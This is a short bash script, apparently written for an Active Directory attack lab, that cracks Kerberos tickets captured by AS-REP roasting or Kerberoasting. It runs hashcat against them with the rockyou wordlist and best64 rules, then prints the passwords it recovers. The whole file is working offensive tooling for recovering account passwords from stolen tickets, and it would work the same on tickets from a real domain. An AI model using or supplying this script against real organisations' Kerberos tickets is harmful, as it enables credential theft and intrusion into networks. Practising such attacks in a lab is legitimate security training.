#!/usr/bin/env bash
# Crack Kerberos tickets pulled from the ad-attack-lab.
# Usage: kerberos_crack.sh <asrep|tgs> <hashfile>
set -euo pipefail
WL="${WL:-wordlists/rockyou.txt}"
RULES="${RULES:-/usr/share/hashcat/rules/best64.rule}"
case "${1:-}" in
  asrep) MODE=18200 ;;   # AS-REP roast
  tgs)   MODE=13100 ;;   # Kerberoast TGS-REP
  *) echo "usage: $0 <asrep|tgs> <hashfile>"; exit 1 ;;
esac
hashcat -m "$MODE" -a 0 -O "$2" "$WL" -r "$RULES"
echo "--- cracked ---"
hashcat -m "$MODE" --show "$2"
